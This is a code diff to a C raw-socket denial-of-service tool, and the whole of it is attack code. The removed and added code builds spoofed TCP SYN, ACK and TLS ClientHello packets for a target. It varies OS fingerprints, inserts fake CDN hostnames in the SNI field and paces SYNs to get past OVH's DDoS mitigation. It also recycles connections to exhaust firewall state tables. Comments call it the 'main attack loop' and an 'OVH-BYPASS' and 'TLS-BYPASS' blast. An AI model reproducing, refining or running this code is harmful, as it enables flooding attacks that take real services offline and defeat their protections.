-            slot_st[b]=ST_SYN_SENT;
-            slot_rn[b]=b;
-            slot_ttl[b]=ttl_t[fast_rand()%ttl_sz]; // Fixed TTL per connection
-            slot_win[b]=win_t[fast_rand()%win_sz]; // Fixed window per connection
-            unsigned char tls_v_choices[] = {0x01, 0x03, 0x03};
-            slot_tls_ver[b]=tls_v_choices[fast_rand()%3];
-            slot_ch_sent[b]=0;
-            // Fix 5: Realistic tsval — jitter per slot around boot-approx base
-            slot_tsval[b] = ts_boot_base + (unsigned int)(b * 997) + (fast_rand() % 1000);
-            slot_tsecr[b]=0; // Will be set from SYN-ACK
-            slot_wscale[b]=0; // Will be set from SYN options
-            slot_pl_sum[b]=0;
-            slot_ipid[b]=fast_rand()&0xFFFF; // Sequential IP ID, random start per connection
+            do { p=(unsigned short)(1024+(fast_rand()%64511)); } while(r_port_map[p]!=-1);
+            r_sp[b]=p; r_port_map[p]=b;
+            r_seq[b]=fast_rand(); r_ack[b]=fast_rand();
+            /* FORCE mode ngay — bỏ qua SYN state machine để max throughput */
+            r_st[b]=R_ST_FORCE; r_rn[b]=b;
+            r_ipid[b]=fast_rand()&0xFFFF;
+            r_tsval[b]=fast_rand();
+            r_ch_sent[b]=1; /* Đã gửi TLS ClientHello (skip) */
+            r_syn_cnt[b]=1; /* Mark as sent */
 
-            th->source=htons(slot_sp[b]);
-            th->dest=bin_target_port;
-            th->doff=8; th->psh=1; th->ack=1; // doff=8: 32 bytes header (20 hdr + 12 TS option)
-            th->seq=htonl(slot_seq[b]);
-            th->ack_seq=htonl(slot_ack[b]);
-            th->window=htons(win_t[b%win_sz]);
+            th->source=htons(r_sp[b]); th->dest=bin_target_port;
+            th->doff=5; th->psh=1; th->ack=1;
+            th->seq=htonl(r_seq[b]); th->ack_seq=htonl(r_ack[b]);
+            th->window=htons(prof->window);
 
-            // Write TCP Timestamp option (NOP, NOP, TS kind=8 len=10, tsval, tsecr)
-            unsigned char *ts_opt = fr + V17ETH + V17IP + 20;
-            ts_opt[0]=1; ts_opt[1]=1;        // NOP, NOP
-            ts_opt[2]=8; ts_opt[3]=10;       // kind=8, len=10
-            *((unsigned int*)(ts_opt+4)) = htonl(slot_tsval[b]);
-            *((unsigned int*)(ts_opt+8)) = 0; // tsecr=0 until 3WHS completes
+            /* IOV + MSG setup */
+            r_iov[b].iov_base = r_use_afp ? fr : (fr+R_ETH);
+            r_iov[b].iov_len = r_use_afp ? R_FLEN : (R_IP+R_TCP+R_PL);
+            r_msg[b].msg_hdr.msg_iov = &r_iov[b];
+            r_msg[b].msg_hdr.msg_iovlen = 1;
+            r_msg[b].msg_hdr.msg_name = r_use_afp ? (void*)&r_dst_sll : (void*)&r_raw_dst;
+            r_msg[b].msg_hdr.msg_namelen = r_use_afp ? sizeof(r_dst_sll) : sizeof(r_raw_dst);
 
-            // Build payload pointer (after 32-byte TCP header)
-            unsigned char *pl=fr+V17ETH+V17IP+V17TCP;
-
-            // Pre-compute TCP checksum base (fixed fields: src_ip, dst_ip, proto, dport, NOP+NOP, TS-kind+len)
-            unsigned short *tw=(unsigned short*)th;
-            unsigned int cs=0;
-            cs+=(src_ip&0xFFFF)+(src_ip>>16);
-            cs+=(bin_target_ip&0xFFFF)+(bin_target_ip>>16);
-            cs+=htons(IPPROTO_TCP);
-            cs+=tw[1]; // dport (fixed)
-            // Fixed TS option prefix: NOP(0x01)+NOP(0x01)=0x0101, kind(0x08)+len(0x0a)=0x080a
-            cs += htons(0x0101); // tw[10]
-            cs += htons(0x080a); // tw[11]
-            tcp_base[b]=cs;
-
-
-
-            // Pre-compute IP checksum base (exclude: tot_len, id, check)
-            unsigned short *iw=(unsigned short*)ih;
-            unsigned int ipttlproto=(unsigned int)(ih->ttl<<8|IPPROTO_TCP);
-            ip_base[b]=iw[0]+iw[3]+htons(ipttlproto)+iw[6]+iw[7]+iw[8]+iw[9];
-
-
-            viov[b].iov_base=use_afp?fr:(fr+V17ETH);
-            viov[b].iov_len=use_afp?V17FLEN:(V17IP+V17TCP+V17PL);
-            vmsg[b].msg_hdr.msg_iov=&viov[b];
-            vmsg[b].msg_hdr.msg_iovlen=1;
-            vmsg[b].msg_hdr.msg_name=use_afp?(void*)&dst_sll:(void*)&raw_dst;
-            vmsg[b].msg_hdr.msg_namelen=use_afp?sizeof(dst_sll):sizeof(raw_dst);
+            /* Pre-compute O(1) checksum bases */
+            ih->check=0; th->check=0;
+            /* IP base: tất cả words trừ id[2] và check[5] */
+            { unsigned short *iw=(unsigned short*)ih;
+              r_base_ip[b]=iw[0]+iw[1]+iw[3]+iw[4]+iw[6]+iw[7]+iw[8]+iw[9]; }
+            /* TCP pseudo + static header trừ source[0], seq[2,3], ack[4,5], check[8] */
+            { unsigned short *tw=(unsigned short*)th;
+              unsigned int pseudo=(src_ip&0xFFFF)+(src_ip>>16)+(bin_target_ip&0xFFFF)+(bin_target_ip>>16)
+                  +htons(IPPROTO_TCP)+htons(R_TCP+R_PL);
+              r_base_cs[b]=pseudo+tw[1]+tw[6]+tw[7]+tw[9]; /* dest+doff/flags+window+urg */ }
         }
 
-        LOG_INFO("T%d: %s iface=%s mode=%s batch=%d pkt=%d",
-                 tid, args.is_v18_tls ? "v18 TLS-BYPASS" : "v17 OVH-BYPASS",
-                 iface,use_afp?"AF_PACKET":"RAW",V17B,use_afp?V17FLEN:V17IP+V17TCP+V17PL);
-        fflush(stdout); // force log output
+        LOG_INFO("T%d: RAW iface=%s mode=%s slots=%d", tid, r_iface,
+                 r_use_afp?"AF_PACKET":"SOCK_RAW", R_SLOTS);
 
-        // === RECV + SYN BUFFERS on HEAP (avoid stack overflow with 8 threads) ===
-        unsigned char *recv_buf = malloc(4096);
-        unsigned char *syn_buf  = malloc(V17FLEN);
-        unsigned char *ack_buf  = malloc(V17FLEN); // reused per SYN-ACK response
-        if(!recv_buf||!syn_buf||!ack_buf){
-            LOG_ERR("T%d: malloc failed",tid);
-            return NULL;
-        }
-        memset(syn_buf,0,V17FLEN);
-        if(use_afp){memcpy(syn_buf,gw_mac,6);memcpy(syn_buf+6,src_mac,6);
-                    syn_buf[12]=8;syn_buf[13]=0;}
-        {struct iphdr *ih2=(struct iphdr*)(syn_buf+V17ETH);
-         ih2->ihl=5;ih2->version=4;ih2->tot_len=htons(V17IP+40); // 20 TCP options
-         ih2->frag_off=htons(0x4000);ih2->ttl=128;ih2->protocol=IPPROTO_TCP; // Win10 TTL=128
-         ih2->saddr=src_ip;ih2->daddr=bin_target_ip;
-         struct tcphdr *th2=(struct tcphdr*)(syn_buf+V17ETH+V17IP);
-         th2->doff=10;th2->syn=1;th2->dest=bin_target_port;
-         th2->window=htons(64240); // Win10 SYN Window
-         
-         // TCP options: MSS=1460, SACK_PERM, TS, WScale=8 (Real Win10 Fingerprint)
-         unsigned char *op=syn_buf+V17ETH+V17IP+20;
-         op[0]=2; op[1]=4; op[2]=0x05; op[3]=0xb4; // MSS 1460
-         op[4]=1; op[5]=3; op[6]=3; op[7]=8;       // NOP, WScale 8
-         op[8]=1; op[9]=1; op[10]=4; op[11]=2;     // NOP, NOP, SACK Permitted
-         op[12]=8; op[13]=10;                      // Timestamp Option
-         *((unsigned int*)(op+14)) = fast_rand();  // TSVal (will be updated per packet)
-         *((unsigned int*)(op+18)) = 0;            // TSecr = 0 for SYN
-        }
-         
-        // Setup ACK Buffer (Pure ACK, No Payload)
-        memset(ack_buf,0,V17FLEN);
-        if(use_afp){memcpy(ack_buf,gw_mac,6);memcpy(ack_buf+6,src_mac,6);
-                    ack_buf[12]=8;ack_buf[13]=0;}
-        {struct iphdr *ih3=(struct iphdr*)(ack_buf+V17ETH);
-         ih3->ihl=5;ih3->version=4;ih3->tot_len=htons(V17IP+V17TCP);
-         ih3->frag_off=htons(0x4000);ih3->ttl=64;ih3->protocol=IPPROTO_TCP;
-         ih3->saddr=src_ip;ih3->daddr=bin_target_ip;
-         struct tcphdr *th3=(struct tcphdr*)(ack_buf+V17ETH+V17IP);
-         th3->doff=5;th3->ack=1;th3->dest=bin_target_port;
-         th3->window=htons(65535);}
+        /* ── VÒNG LẶP RAW MODE ── */
+        unsigned int r_round = 0;
+        long long r_l5_start; clock_gettime(CLOCK_MONOTONIC, (struct timespec*)&r_l5_start);
+        int r_l4_active = 0;
 
+        while (1) {
+            r_round++;
 
-
-        unsigned int round=0;
-        // Main attack loop
-        while(1){
-            round++;
-            // === STATEFUL MODE: 3-Way Handshake ===
-            // 1. Send SYN — Fix 2: SYN rate budget per round to avoid OVH HCAP
-            // HCAP triggers at ~200 SYN/s per source IP. We limit to 64-127 new SYNs/round.
-            // Shock-start: first 50 rounds blast ALL slots to exploit pre-VAC activation window
-            // (~0.5s before OVH VAC fully activates), then throttle to sustain mode.
-            int syn_budget = (round <= 50) ? (int)V17B : (64 + (int)(fast_rand() % 64));
-            for(int b=0;b<V17B && syn_budget > 0;b++){
-                if(slot_st[b]==ST_SYN_SENT){
-                    syn_budget--;
-                    // Soft start: don't activate slot until its wave arrives
-                    unsigned int activate_round = (unsigned int)((unsigned long long)b * SOFT_START_ROUNDS / V17B);
-                    if(round < activate_round) continue;
-
-                    // Exponential SYN backoff: 10→20→40→80→160 rounds
-                    unsigned int syn_retries = slot_syn_sent[b] > 0 ? (round > slot_syn_sent[b] ? 1 : 0) : 0;
-                    unsigned int retry_interval = 10 << (syn_retries > 4 ? 4 : syn_retries);
-                    if(round - slot_syn_sent[b] < retry_interval && slot_syn_sent[b] != 0) continue;
-                    slot_syn_sent[b] = round;
-
-                    struct iphdr *ih2=(struct iphdr*)(syn_buf+V17ETH);
-                    ih2->id=htons(fast_rand()&0xFFFF);
-                    ih2->check=0;
-                    unsigned int ic2=0;
-                    unsigned short *iw2 = (unsigned short*)ih2;
-                    for(int i=0; i<10; i++) ic2 += iw2[i];
-                    ic2 = (ic2>>16)+(ic2&0xFFFF); ic2 += (ic2>>16);
-                    ih2->check = (unsigned short)~ic2;
-
-                    struct tcphdr *th2=(struct tcphdr*)(syn_buf+V17ETH+V17IP);
-                    th2->source=htons(slot_sp[b]);
-                    th2->seq=htonl(slot_seq[b]);
-                    th2->check=0;
-                    
-                    // Randomize TCP Options per connection to bypass SYN Fingerprinting
-                    unsigned char *op = syn_buf+V17ETH+V17IP+20;
-                    int opt_len = 0;
-                    unsigned int r_opt = fast_rand() % 4; // 4 different OS profiles
-
-                    if (r_opt == 0) {
-                        // Windows/Chrome profile: MSS=1460, SACK, TS, WScale=8
-                        op[0]=2;op[1]=4;op[2]=0x05;op[3]=0xB4; // MSS=1460
-                        op[4]=4;op[5]=2;                       // SACK
-                        op[6]=8;op[7]=10;                      // Timestamps (value filled later if needed, left 0 for now)
-                        *((unsigned int*)(op+8)) = fast_rand(); // Random TS val
-                        *((unsigned int*)(op+12)) = 0;         // TS echo reply
-                        op[16]=1;op[17]=3;op[18]=3;op[19]=8;   // NOP, WScale=8
-                        opt_len = 20;
-                    } else if (r_opt == 1) {
-                        // Linux profile: MSS=1440, SACK, TS, WScale=7
-                        op[0]=2;op[1]=4;op[2]=0x05;op[3]=0xA0; // MSS=1440
-                        op[4]=4;op[5]=2;                       // SACK
-                        op[6]=8;op[7]=10;                      // Timestamps
-                        *((unsigned int*)(op+8)) = fast_rand();
-                        *((unsigned int*)(op+12)) = 0;
-                        op[16]=1;op[17]=3;op[18]=3;op[19]=7;   // NOP, WScale=7
-                        opt_len = 20;
-                    } else if (r_opt == 2) {
-                        // iOS/Safari profile: MSS=1400, NOP, WScale=6, NOP, NOP, TS, SACK, EOL
-                        op[0]=2;op[1]=4;op[2]=0x05;op[3]=0x78; // MSS=1400
-                        op[4]=1;op[5]=3;op[6]=3;op[7]=6;       // NOP, WScale=6
-                        op[8]=1;op[9]=1;op[10]=8;op[11]=10;    // NOP, NOP, TS
-                        *((unsigned int*)(op+12)) = fast_rand();
-                        *((unsigned int*)(op+16)) = 0;
-                        op[20]=4;op[21]=2;op[22]=0;op[23]=0;   // SACK, EOL (requires 24 bytes options)
-                        opt_len = 24;
-                    } else {
-                        // Basic profile (e.g. IoT/Simple stack): MSS=1460, NOP, WScale=4
-                        op[0]=2;op[1]=4;op[2]=0x05;op[3]=0xB4; // MSS=1460
-                        op[4]=1;op[5]=3;op[6]=3;op[7]=4;       // NOP, WScale=4
-                        op[8]=0;op[9]=0;op[10]=0;op[11]=0;     // EOL padding
-                        opt_len = 12; // 12 bytes options
-                    }
-                    
-                    // Adjust IP and TCP header lengths based on random options
-                    ih2->tot_len=htons(V17IP+20+opt_len);
-                    th2->doff=(20+opt_len)/4;
-
-                    // Recalculate IP Checksum with new tot_len
-                    ih2->check=0;
-                    ic2=0;
-                    for(int i=0; i<10; i++) ic2 += iw2[i];
-                    ic2 = (ic2>>16)+(ic2&0xFFFF); ic2 += (ic2>>16);
-                    ih2->check = (unsigned short)~ic2;
-
-                    // Recalculate TCP Checksum with new options
-                    th2->check=0;
-                    unsigned short *tw2 = (unsigned short*)th2;
-                    unsigned int cs2 = (src_ip&0xFFFF)+(src_ip>>16)+(bin_target_ip&0xFFFF)+(bin_target_ip>>16)+htons(IPPROTO_TCP)+htons(20+opt_len);
-                    for(int i=0; i<(20+opt_len)/2; i++) cs2 += tw2[i]; 
-                    cs2 = (cs2>>16)+(cs2&0xFFFF); cs2 += (cs2>>16);
-                    th2->check = (unsigned short)~cs2;
-                    
-                    if(use_afp){
-                        int s = sendto(fd_send,syn_buf,V17ETH+V17IP+20+opt_len,0,(struct sockaddr*)&dst_sll,sizeof(dst_sll));
-                        // (Removed to prevent log spam)
-                    } else {
-                        int s = sendto(fd_send,syn_buf+V17ETH,V17IP+20+opt_len,0,(struct sockaddr*)&raw_dst,sizeof(raw_dst));
-                        if(round==1 && b==0) { LOG_INFO("T%d: sendto AF_INET SYN returned %d (err: %s)", tid, s, strerror(errno)); fflush(stdout); }
-                    }
-                }
+            /* L4 BLAST NGAY LẬP TỨC — không chờ */
+            if (!r_l4_active) {
+                r_l4_active=1;
+                if(tid==0) LOG_INFO("T%d: IMMEDIATE L4+L5 BLAST", tid);
             }
 
-            // 2. Recv SYN-ACK + server data ACK (Fix 3: ACK server data to prevent zombie detect)
-            int eth_off = use_afp ? V17ETH : 0;
-            int rcvd=0;
-            while((rcvd=recv(fd_recv,recv_buf,4096,MSG_DONTWAIT))>0){
-                if(rcvd < eth_off + V17IP + 20) continue;
-                struct iphdr *rih=(struct iphdr*)(recv_buf + eth_off);
-                if(rih->protocol!=IPPROTO_TCP) continue;
-                if(rih->saddr != bin_target_ip) continue;
-                struct tcphdr *rth=(struct tcphdr*)(recv_buf + eth_off + (rih->ihl<<2));
-                unsigned short dport=ntohs(rth->dest);
-                int b = port_to_slot[dport];
+            /* 1. Gửi SYN cho slots đang chờ */
+            for (int b=0; b<R_SLOTS; b++) {
+                if (r_st[b]!=R_ST_SYN) continue;
+                if (r_syn_cnt[b]>0 && r_round-r_syn_cnt[b] < (10u<<(r_syn_cnt[b]>4?4:r_syn_cnt[b])))
+                    continue;
+                r_syn_cnt[b] = r_round;
 
-                if(rth->syn && rth->ack && b >= 0 && slot_st[b]==ST_SYN_SENT) {
-                // === SYN-ACK: complete 3WHS ===
-                    slot_ack[b]=ntohl(rth->seq)+1;
-                    slot_seq[b]++;
-                    
-                    unsigned int server_tsval = 0;
-                    int r_opt_len = (rth->doff * 4) - 20;
-                    unsigned char *r_opt = (unsigned char *)rth + 20;
-                    for (int i = 0; i < r_opt_len; ) {
-                        if (r_opt[i] == 0) break;
-                        if (r_opt[i] == 1) { i++; continue; }
-                        if (r_opt[i+1] < 2) break; // malformed option guard
-                        if (r_opt[i] == 8 && r_opt[i+1] == 10 && i + 10 <= r_opt_len) {
-                            server_tsval = ntohl(*((unsigned int*)(r_opt + i + 2)));
-                            break;
-                        }
-                        // Extract server WScale from SYN-ACK
-                        if (r_opt[i] == 3 && r_opt[i+1] == 3 && i + 3 <= r_opt_len) {
-                            slot_wscale[b] = r_opt[i+2] > 14 ? 14 : r_opt[i+2];
-                        }
-                        i += r_opt[i+1];
-                    }
-                    // Save server tsval for echoing in data packets
-                    slot_tsecr[b] = server_tsval;
+                const V17OsProfile *prof = &v17_profiles[r_prof_idx[b]];
 
-                    struct iphdr *ih3=(struct iphdr*)(ack_buf+V17ETH);
-                    ih3->id=htons(++slot_ipid[b]);
-                    
-                    int ack_opt_len = 0;
-                    if (server_tsval != 0) {
-                        unsigned char *op3 = ack_buf+V17ETH+V17IP+20;
-                        op3[0]=1; op3[1]=1; // NOP NOP
-                        op3[2]=8; op3[3]=10; // Timestamps
-                        *((unsigned int*)(op3+4)) = htonl(slot_tsval[b]);
-                        *((unsigned int*)(op3+8)) = htonl(server_tsval); // echo server tsval
-                        slot_tsval[b] += 50 + (fast_rand() % 50); // realistic increment
-                        ack_opt_len = 12;
-                    }
-                    
-                    ih3->tot_len=htons(V17IP+20+ack_opt_len);
-                    struct tcphdr *th3=(struct tcphdr*)(ack_buf+V17ETH+V17IP);
-                    th3->source=htons(slot_sp[b]);
-                    th3->seq=htonl(slot_seq[b]);
-                    th3->ack_seq=htonl(slot_ack[b]);
-                    th3->doff=(20+ack_opt_len)/4;
-                    // Window advertised = our receive window (not scaled)
-                    th3->window=htons(65535);
-                    
-                    ih3->check=0;
-                    unsigned int ic3=0;
-                    unsigned short *iw3 = (unsigned short*)ih3;
-                    for(int i=0; i<10; i++) ic3 += iw3[i];
-                    ic3 = (ic3>>16)+(ic3&0xFFFF); ic3 += (ic3>>16);
-                    ih3->check = (unsigned short)~ic3;
+                /* Xây SYN buffer */
+                memset(r_syn_buf, 0, R_FLEN);
+                if (r_use_afp) { memcpy(r_syn_buf,r_gw_mac,6); memcpy(r_syn_buf+6,r_src_mac,6);
+                                 r_syn_buf[12]=8; r_syn_buf[13]=0; }
+                struct iphdr *ih2 = (struct iphdr*)(r_syn_buf+R_ETH);
+                ih2->ihl=5; ih2->version=4; ih2->frag_off=htons(0x4000);
+                ih2->ttl=prof->ttl; ih2->protocol=IPPROTO_TCP;
+                ih2->saddr=src_ip; ih2->daddr=bin_target_ip;
+                ih2->id=htons(++r_ipid[b]);
 
-                    th3->check=0;
-                    unsigned short *tw3 = (unsigned short*)th3;
-                    unsigned int cs3 = (src_ip&0xFFFF)+(src_ip>>16)+(bin_target_ip&0xFFFF)+(bin_target_ip>>16)+htons(IPPROTO_TCP)+htons(20+ack_opt_len);
-                    for(int i=0; i<(20+ack_opt_len)/2; i++) cs3 += tw3[i]; 
-                    cs3 = (cs3>>16)+(cs3&0xFFFF); cs3 += (cs3>>16);
-                    th3->check = (unsigned short)~cs3;
-                    
-                    if(use_afp){
-                        sendto(fd_send,ack_buf,V17ETH+V17IP+20+ack_opt_len,0,(struct sockaddr*)&dst_sll,sizeof(dst_sll));
-                    } else {
-                        sendto(fd_send,ack_buf+V17ETH,V17IP+20+ack_opt_len,0,(struct sockaddr*)&raw_dst,sizeof(raw_dst));
-                    }
-                    slot_st[b]=ST_ESTABLISHED;
-                    slot_ch_sent[b]=0;
-                } // end SYN-ACK
-                else if(rth->ack && !rth->syn && !rth->rst && b >= 0 && slot_st[b]==ST_ESTABLISHED) {
-                    // === Fix 3: Server PSH+ACK (server sending data) — ACK it ===
-                    // Without this, OVH behavioral sees zombie connection and drops it
-                    int ihl = rih->ihl << 2;
-                    int tcphdr_len = rth->doff << 2;
-                    int data_len = (int)ntohs(rih->tot_len) - ihl - tcphdr_len;
-                    if(data_len > 0 && data_len < 65536) {
-                        slot_ack[b] += (unsigned int)data_len; // advance ACK by data received
-                        // Build bare ACK using ack_buf
-                        struct iphdr *ih3=(struct iphdr*)(ack_buf+V17ETH);
-                        struct tcphdr *th3=(struct tcphdr*)(ack_buf+V17ETH+V17IP);
-                        ih3->id=htons(++slot_ipid[b]);
-                        th3->source=htons(slot_sp[b]);
-                        th3->seq=htonl(slot_seq[b]);
-                        th3->ack_seq=htonl(slot_ack[b]);
-                        th3->doff=5; th3->ack=1; th3->psh=0;
-                        ih3->tot_len=htons(V17IP+20);
-                        ih3->check=0;
-                        unsigned short *iw3a=(unsigned short*)ih3;
-                        unsigned int ic3a=0; for(int i=0;i<10;i++) ic3a+=iw3a[i];
-                        ic3a=(ic3a>>16)+(ic3a&0xFFFF); ic3a+=(ic3a>>16);
-                        ih3->check=(unsigned short)~ic3a;
-                        th3->check=0;
-                        unsigned short *tw3a=(unsigned short*)th3;
-                        unsigned int cs3a=(src_ip&0xFFFF)+(src_ip>>16)+(bin_target_ip&0xFFFF)+(bin_target_ip>>16)+htons(IPPROTO_TCP)+htons(20);
-                        for(int i=0;i<10;i++) cs3a+=tw3a[i];
-                        cs3a=(cs3a>>16)+(cs3a&0xFFFF); cs3a+=(cs3a>>16);
-                        th3->check=(unsigned short)~cs3a;
-                        if(use_afp) sendto(fd_send,ack_buf,V17ETH+V17IP+20,0,(struct sockaddr*)&dst_sll,sizeof(dst_sll));
-                        else        sendto(fd_send,ack_buf+V17ETH,V17IP+20,0,(struct sockaddr*)&raw_dst,sizeof(raw_dst));
-                    }
-                } // end server data ACK
-            } // end recv loop
-            struct mmsghdr vmsg_active[V17B];
-            int valid_pkts = 0;
-            
-            for(int b=0;b<V17B;b++){
-                // Blast on ESTABLISHED or FORCE_EST fallback
-                if(slot_st[b] != ST_ESTABLISHED && slot_st[b] != ST_FORCE_EST){
-                    if(slot_syn_sent[b] >= SYN_MAX_RETRY && slot_syn_sent[b] > 0) {
-                        // Fallback: target FW dropped SYN — blast anyway (stateless path)
-                        // Use seq+1 as ack (better than pure random for some stateless FWs)
-                        slot_st[b] = ST_FORCE_EST;
-                        slot_ack[b] = slot_seq[b] + 1;
-                    } else {
-                        continue;
-                    }
-                }
-                unsigned char *fr=vbuf[b];
-                struct iphdr *ih=(struct iphdr*)(fr+V17ETH);
-                struct tcphdr *th=(struct tcphdr*)(fr+V17ETH+V17IP);
-                unsigned short *tw=(unsigned short*)th;
+                struct tcphdr *th2 = (struct tcphdr*)(r_syn_buf+R_ETH+R_IP);
+                th2->source=htons(r_sp[b]); th2->dest=bin_target_port;
+                th2->seq=htonl(r_seq[b]); th2->syn=1;
+                th2->window=htons(prof->window);
 
-                unsigned int current_pl;
-                unsigned short flags;
+                /* TCP options theo OS profile */
+                unsigned char *opts = r_syn_buf+R_ETH+R_IP+20;
+                int opt_len = 0;
+                V17_BUILD_SYN_OPTS(opts, *prof, r_tsval[b], opt_len);
+                th2->doff = (20+opt_len)/4;
+                ih2->tot_len = htons(R_IP+20+opt_len);
 
-                slot_rn[b]++;
+                /* IP checksum */
+                ih2->check=0;
+                { unsigned int c=0; unsigned short *w=(unsigned short*)ih2;
+                  for(int i=0;i<10;i++) c+=w[i];
+                  c=(c>>16)+(c&0xFFFF); c+=(c>>16);
+                  ih2->check=(unsigned short)~c; }
 
-                // === TLS ClientHello: send ONCE per connection after 3WHS ===
-                if (args.is_v18_tls && slot_st[b] == ST_ESTABLISHED && !slot_ch_sent[b]) {
-                    unsigned char ch_buf[512];
-                    memset(ch_buf, 0, sizeof(ch_buf));
-                    if(use_afp){memcpy(ch_buf,gw_mac,6);memcpy(ch_buf+6,src_mac,6);ch_buf[12]=8;ch_buf[13]=0;}
-                    
-                    // Build TLS 1.2 ClientHello payload
-                    unsigned char ch_payload[256];
-                    int cp = 0;
-                    ch_payload[cp++] = 0x16; // Handshake
-                    ch_payload[cp++] = 0x03; ch_payload[cp++] = 0x01; // TLS 1.0 compat
-                    int rec_len_pos = cp; cp += 2; // record length placeholder
-                    ch_payload[cp++] = 0x01; // ClientHello type
-                    int hs_len_pos = cp; cp += 3; // handshake length placeholder
-                    ch_payload[cp++] = 0x03; ch_payload[cp++] = 0x03; // TLS 1.2
-                    for(int i=0;i<32;i++) ch_payload[cp++] = fast_rand() & 0xFF; // Client Random
-                    ch_payload[cp++] = 32; // Session ID length
-                    for(int i=0;i<32;i++) ch_payload[cp++] = fast_rand() & 0xFF; // Session ID
-                    // Cipher Suites (Chrome-like)
-                    unsigned short ciphers[] = {0x1301,0x1302,0x1303,0xc02c,0xc02b,0xc030,0xc02f,0xcca9,0xcca8,0x00ff};
-                    int n_ciphers = sizeof(ciphers)/sizeof(ciphers[0]);
-                    ch_payload[cp++] = (n_ciphers*2) >> 8; ch_payload[cp++] = (n_ciphers*2) & 0xFF;
-                    for(int i=0;i<n_ciphers;i++){ch_payload[cp++]=ciphers[i]>>8;ch_payload[cp++]=ciphers[i]&0xFF;}
-                    ch_payload[cp++] = 1; ch_payload[cp++] = 0; // Compression: null
-                    // Extensions
-                    int ext_len_pos = cp; cp += 2;
-                    int ext_start = cp;
-                    // SNI extension — use real-looking CDN/cloud hostnames to pass TLS inspection
-                    static const char *sni_pool[] = {
-                        "cloudflare.com","akamai.net","fastly.net","cdn77.com",
-                        "google.com","amazonaws.com","azure.microsoft.com","github.com",
-                        "cloudfront.net","edgecastcdn.net","stackpath.net","maxcdn.com"
-                    };
-                    const char *sni_host = sni_pool[fast_rand() % 12];
-                    int sni_len = (int)strlen(sni_host);
-                    ch_payload[cp++]=0x00;ch_payload[cp++]=0x00; // extension type: server_name
-                    int sni_ext_len = sni_len + 5;
-                    ch_payload[cp++]=(sni_ext_len)>>8;ch_payload[cp++]=(sni_ext_len)&0xFF;
-                    ch_payload[cp++]=(sni_ext_len-2)>>8;ch_payload[cp++]=(sni_ext_len-2)&0xFF;
-                    ch_payload[cp++]=0x00; // host_name type
-                    ch_payload[cp++]=sni_len>>8;ch_payload[cp++]=sni_len&0xFF;
-                    memcpy(ch_payload+cp, sni_host, sni_len); cp += sni_len;
-                    // supported_versions extension
-                    ch_payload[cp++]=0x00;ch_payload[cp++]=0x2b;
-                    ch_payload[cp++]=0x00;ch_payload[cp++]=0x05;
-                    ch_payload[cp++]=0x04;
-                    ch_payload[cp++]=0x03;ch_payload[cp++]=0x04; // TLS 1.3
-                    ch_payload[cp++]=0x03;ch_payload[cp++]=0x03; // TLS 1.2
-                    // Fill lengths
-                    int ext_total = cp - ext_start;
-                    ch_payload[ext_len_pos] = ext_total >> 8; ch_payload[ext_len_pos+1] = ext_total & 0xFF;
-                    int hs_len = cp - hs_len_pos - 3;
-                    ch_payload[hs_len_pos] = (hs_len >> 16) & 0xFF;
-                    ch_payload[hs_len_pos+1] = (hs_len >> 8) & 0xFF;
-                    ch_payload[hs_len_pos+2] = hs_len & 0xFF;
-                    int rec_len = cp - rec_len_pos - 2;
-                    ch_payload[rec_len_pos] = rec_len >> 8; ch_payload[rec_len_pos+1] = rec_len & 0xFF;
-                    
-                    // IP + TCP headers for ClientHello packet
-                    struct iphdr *cih=(struct iphdr*)(ch_buf+V17ETH);
-                    cih->ihl=5;cih->version=4;
-                    cih->tot_len=htons(V17IP+V17TCP+cp);
-                    cih->frag_off=htons(0x4000);cih->ttl=slot_ttl[b];cih->protocol=IPPROTO_TCP;
-                    cih->saddr=src_ip;cih->daddr=bin_target_ip;
-                    cih->id=htons(++slot_ipid[b]);
-                    
-                    struct tcphdr *cth=(struct tcphdr*)(ch_buf+V17ETH+V17IP);
-                    memset(cth,0,V17TCP);
-                    cth->source=htons(slot_sp[b]);cth->dest=bin_target_port;
-                    cth->seq=htonl(slot_seq[b]);cth->ack_seq=htonl(slot_ack[b]);
-                    cth->doff=5;cth->psh=1;cth->ack=1;
-                    cth->window=htons(slot_win[b]);
-                    // Copy ClientHello payload
-                    memcpy(ch_buf+V17ETH+V17IP+V17TCP, ch_payload, cp);
-                    
-                    // IP checksum
-                    cih->check=0;
-                    unsigned short *ciw=(unsigned short*)cih;
-                    unsigned int cic=0;
-                    for(int i=0;i<10;i++) cic+=ciw[i];
-                    cic=(cic>>16)+(cic&0xFFFF);cic+=(cic>>16);
-                    cih->check=(unsigned short)~cic;
-                    // TCP checksum
-                    cth->check=0;
-                    unsigned short *ctw=(unsigned short*)cth;
-                    unsigned int ccs=(src_ip&0xFFFF)+(src_ip>>16)+(bin_target_ip&0xFFFF)+(bin_target_ip>>16)+htons(IPPROTO_TCP)+htons(V17TCP+cp);
-                    for(int i=0;i<(V17TCP+cp)/2;i++) ccs+=ctw[i];
-                    if((V17TCP+cp)%2) ccs+=htons(((unsigned short)((unsigned char*)cth)[V17TCP+cp-1])<<8);
-                    ccs=(ccs>>16)+(ccs&0xFFFF);ccs+=(ccs>>16);
-                    cth->check=(unsigned short)~ccs;
-                    
-                    if(use_afp){
-                        sendto(fd_send,ch_buf,V17ETH+V17IP+V17TCP+cp,0,(struct sockaddr*)&dst_sll,sizeof(dst_sll));
-                    } else {
-                        sendto(fd_send,ch_buf+V17ETH,V17IP+V17TCP+cp,0,(struct sockaddr*)&raw_dst,sizeof(raw_dst));
-                    }
-                    slot_seq[b] += cp;
-                    slot_ch_sent[b] = 1;
-                    thread_stats[tid].packets++;
-                    thread_stats[tid].bytes += V17ETH+V17IP+V17TCP+cp;
-                }
+                /* TCP checksum */
+                th2->check=0;
+                { unsigned int c=(src_ip&0xFFFF)+(src_ip>>16)
+                    +(bin_target_ip&0xFFFF)+(bin_target_ip>>16)
+                    +htons(IPPROTO_TCP)+htons(20+opt_len);
+                  unsigned short *w=(unsigned short*)th2;
+                  for(int i=0;i<(20+opt_len)/2;i++) c+=w[i];
+                  c=(c>>16)+(c&0xFFFF); c+=(c>>16);
+                  th2->check=(unsigned short)~c; }
 
-                // Connection recycling — fast for state table exhaustion
-                // Long-lived connections: exhaust FW state table longer, avoid SYN flood signature
-                unsigned int churn_threshold = (args.port == 80 || args.port == 443) ? 
-                                                (20000 + (fast_rand() % 30000)) : (40000 + (fast_rand() % 60000));
-                
-                if(slot_rn[b] > churn_threshold) {
-                    // Mix of RST and FIN/ACK for state exhaustion
-                    if (fast_rand() % 2 == 0) {
